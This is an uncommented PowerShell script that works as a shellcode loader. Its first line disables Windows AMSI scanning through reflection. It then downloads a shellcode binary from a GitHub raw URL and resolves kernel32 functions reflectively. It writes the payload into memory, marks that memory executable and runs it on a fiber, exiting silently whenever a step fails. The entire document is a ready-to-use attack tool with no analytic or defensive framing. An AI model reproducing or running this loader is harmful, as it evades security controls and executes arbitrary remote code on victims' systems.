[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"

$buf = $null
try {
    $buf = (New-Object Net.WebClient).DownloadData($url)
} catch {
    exit
}

$size = [uint32]$buf.Length
if ($size -lt 64) { exit }

$kernel32 = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') } | ForEach-Object {
    $_.GetType('System.Runtime.InteropServices.DllImportAttribute').Module.GetType('System.Reflection.Emit.TypeBuilder').GetMethod('GetProcAddress', [Reflection.BindingFlags]'NonPublic,Static').Invoke($null, @([IntPtr]::Zero, "kernel32.dll"))
} | ForEach-Object { [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($_, [Type]::GetType('System.Func`2[System.IntPtr,System.IntPtr]')) }

function Get-Proc {
    param([string]$name)
    $addr = $kernel32.Invoke([IntPtr]::Zero, $name)
    if ($addr -eq [IntPtr]::Zero) { throw "GetProcAddress failed: $name" }
    return $addr
}

$delegateTypes = @{
    VirtualAlloc    = [Func[IntPtr, uint, uint, uint, IntPtr]]
    VirtualProtect  = [Func[IntPtr, uint, uint, [uint].MakeByRefType(), [bool]]]
    VirtualFree     = [Func[IntPtr, uint, uint, [bool]]]
    ConvertThreadToFiber = [Func[IntPtr, IntPtr]]
    CreateFiber     = [Func[uint, IntPtr, IntPtr, IntPtr]]
    SwitchToFiber   = [Action[IntPtr]]
    DeleteFiber     = [Action[IntPtr]]
}

$funcs = @{}
foreach ($kv in $delegateTypes.GetEnumerator()) {
    $ptr = Get-Proc $kv.Key
    $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, $kv.Value)
    $funcs[$kv.Key] = $delegate
}

$MEM_COMMIT             = 0x1000
$MEM_RESERVE            = 0x2000
$PAGE_READWRITE         = 0x04
$PAGE_EXECUTE_READ      = 0x20
$MEM_RELEASE            = 0x8000

$mem = $funcs.VirtualAlloc.Invoke([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
if ($mem -eq [IntPtr]::Zero) { exit }

[Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $size)

$oldProtect = 0
$success = $funcs.VirtualProtect.Invoke($mem, $size, $PAGE_EXECUTE_READ, [ref]$oldProtect)
if (-not $success) {
    $funcs.VirtualFree.Invoke($mem, 0, $MEM_RELEASE)
    exit
}

$mainFiber = $funcs.ConvertThreadToFiber.Invoke([IntPtr]::Zero)
if ($mainFiber -eq [IntPtr]::Zero) {
    $funcs.VirtualFree.Invoke($mem, 0, $MEM_RELEASE)
    exit
}

$fiber = $funcs.CreateFiber.Invoke(0, $mem, [IntPtr]::Zero)
if ($fiber -eq [IntPtr]::Zero) {
    $funcs.VirtualFree.Invoke($mem, 0, $MEM_RELEASE)
    exit
}

$funcs.SwitchToFiber.Invoke($fiber)

$funcs.DeleteFiber.Invoke($fiber)
$funcs.VirtualFree.Invoke($mem, 0, $MEM_RELEASE)
